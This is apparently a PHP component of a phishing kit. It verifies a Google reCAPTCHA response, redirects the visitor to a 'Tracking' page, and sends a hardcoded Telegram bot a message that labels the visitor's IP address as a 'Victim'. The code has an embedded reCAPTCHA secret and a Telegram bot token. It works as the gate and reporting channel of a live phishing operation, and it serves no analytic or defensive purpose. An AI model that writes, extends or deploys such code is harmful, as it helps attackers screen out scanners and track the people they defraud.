<?php
session_start();
error_reporting(0);

$captcha;
if(isset($_POST['g-recaptcha-response'])){
  $captcha=$_POST['g-recaptcha-response'];
}
if(!$captcha){
  header('Location: index.php');
  exit;
}
$secretKey = "6LffMGcUAAAAACw-0oBJ13czW1dsl_0HbXbxEVUY";
$ip = $_SERVER['REMOTE_ADDR'];
$response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$secretKey."&response=".$captcha."&remoteip=".$ip);
$responseKeys = json_decode($response,true);

if(intval($responseKeys["success"]) !== 1) {
  header('Location: index.php');
} else {
  header('Location: Tracking/index0.php');
  
  // message will be sent after successful captcha verification
  $message = "💢 Victim '$ip' exited [🔑] Recaptcha Page [🔑] 💢"  ;
  $botToken = "6691628482:AAERSLS9uTXK7tc0LqHYbAUv-YO2dD2Etvw";
  $chatID = "2133339496";

  file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message");
}
?>
